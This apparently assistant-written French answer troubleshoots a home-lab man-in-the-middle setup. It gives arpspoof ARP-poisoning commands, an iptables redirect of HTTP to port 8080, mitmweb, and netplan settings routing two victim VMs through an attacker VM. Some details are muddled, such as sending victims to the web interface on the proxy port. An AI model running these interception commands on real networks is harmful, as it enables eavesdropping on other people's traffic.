Le problème est lié à la façon dont les requêtes HTTP sont redirigées vers `mitmproxy` et comment `mitmproxy` interprète ces requêtes. Les erreurs `Invalid HTTP request form` indiquent que les requêtes redirigées ne sont pas dans le format attendu par `mitmproxy`.

Pour résoudre ce problème, nous devons nous assurer que `mitmproxy` est configuré correctement pour intercepter le trafic HTTP. Voici les étapes mises à jour pour assurer une configuration correcte :

### Commandes à Exécuter sur la Machine Attaquant (Attacker)

1. **Activer le transfert IP** :
   ```sh
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
   ```

2. **Empoisonner les tables ARP** :
   - Empoisonner la table ARP de Victim1 :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
     ```
   - Empoisonner la table ARP de Victim2 (ouvrir un autre terminal pour cette commande) :
     ```sh
     sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
     ```

3. **Rediriger le trafic HTTP vers le port 8080** :
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-ports 8080
   ```

4. **Lancer `mitmweb` sur le port 8080** :
   ```sh
   sudo mitmweb -p 8080
   ```

### Configuration des Machines Victimes (Victim1 et Victim2)

Pour que le trafic des machines victimes soit redirigé via l'attaquant, il est nécessaire de configurer des routes et, éventuellement, des entrées ARP statiques.

1. **Configurer des adresses IP statiques et des routes** :
   - **Victim1** :
     ```sh
     sudo nano /etc/netplan/00-installer-config.yaml
     ```
     Ajoutez ou modifiez le fichier avec :
     ```yaml
     network:
       version: 2
       ethernets:
         enp0s3:
           dhcp4: true
         enp0s8:
           dhcp4: no
           addresses:
             - 10.0.2.20/24
           nameservers:
             addresses:
               - 8.8.8.8
           routes:
             - to: default
               via: 10.0.2.10
     ```
     Appliquez les changements :
     ```sh
     sudo netplan apply
     ```

   - **Victim2** :
     ```sh
     sudo nano /etc/netplan/00-installer-config.yaml
     ```
     Ajoutez ou modifiez le fichier avec :
     ```yaml
     network:
       version: 2
       ethernets:
         enp0s3:
           dhcp4: true
         enp0s8:
           dhcp4: no
           addresses:
             - 10.0.2.30/24
           nameservers:
             addresses:
               - 8.8.8.8
           routes:
             - to: default
               via: 10.0.2.10
     ```
     Appliquez les changements :
     ```sh
     sudo netplan apply
     ```

2. **Configurer des entrées ARP statiques (optionnel)** :
   - **Victim1** :
     ```sh
     sudo ip neigh add 10.0.2.10 lladdr <MAC de Attacker> dev enp0s8
     sudo ip neigh add 10.0.2.30 lladdr <MAC de Victim2> dev enp0s8
     ```
   - **Victim2** :
     ```sh
     sudo ip neigh add 10.0.2.10 lladdr <MAC de Attacker> dev enp0s8
     sudo ip neigh add 10.0.2.20 lladdr <MAC de Victim1> dev enp0s8
     ```

### Vérification de la Connectivité

1. **Vérifiez la connectivité entre les machines** :
   - Depuis **Victim1** :
     ```sh
     ping 10.0.2.10
     ping 10.0.2.30
     ```
   - Depuis **Victim2** :
     ```sh
     ping 10.0.2.10
     ping 10.0.2.20
     ```
   - Depuis **Attacker** :
     ```sh
     ping 10.0.2.20
     ping 10.0.2.30
     ```

### Test de l'Attaque MITM

1. **Empoisonner les tables ARP** depuis l'attaquant :
   ```sh
   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
   ```

2. **Rediriger le trafic HTTP vers `mitmproxy`** sur le port 8080 :
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-ports 8080
   ```

3. **Lancer `mitmweb`** sur le port 8080 :
   ```sh
   sudo mitmweb -p 8080
   ```

4. **Accéder à l'interface web de `mitmweb`** :
   - Depuis **Victim1** et **Victim2**, ouvrez un navigateur et accédez à `http://10.0.2.10:8080` (en remplaçant `10.0.2.10` par l'adresse IP de l'interface interne de l'attaquant).

En suivant ces étapes, l'interface web de `mitmweb` sera accessible via le port 8080 et les machines victimes redirigeront leur trafic HTTP vers l'attaquant, permettant ainsi de visualiser le trafic intercepté.
